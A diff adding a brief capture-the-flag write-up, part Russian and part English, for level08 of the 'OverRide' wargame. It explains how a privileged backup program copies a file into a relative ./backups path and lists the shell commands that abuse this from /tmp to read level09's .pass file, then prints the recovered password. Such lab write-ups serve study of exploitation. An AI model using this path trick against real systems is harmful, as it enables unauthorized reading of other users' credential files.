@@ -1,0 +1,21 @@
+
+Программе должна подаваться директория.
+Открывается backups/.log для записи на директории, в которой запускается программа
+Дальше открывается директория на чтение, которая подана как аргумент.
+Копируется содержимое в 10 битов из ./backups/ в поданную директорию.
+Наш метод фальсифицирует путь и подаёт путь, к которому у нас есть доступ.
+
+1. Convert file to C and analyze code.
+Here we see program read file with pass and write it
+by way ".backups/."
+2. And we need all rules to use it. For it create folder /tmp
+level08@OverRide:~$ cd /tmp
+3. Make directory for copy:
+level08@OverRide:/tmp$ mkdir -p backups/home/users/level09/
+3. Run program from tmp:
+level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
+4. See password:
+level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+
+ 
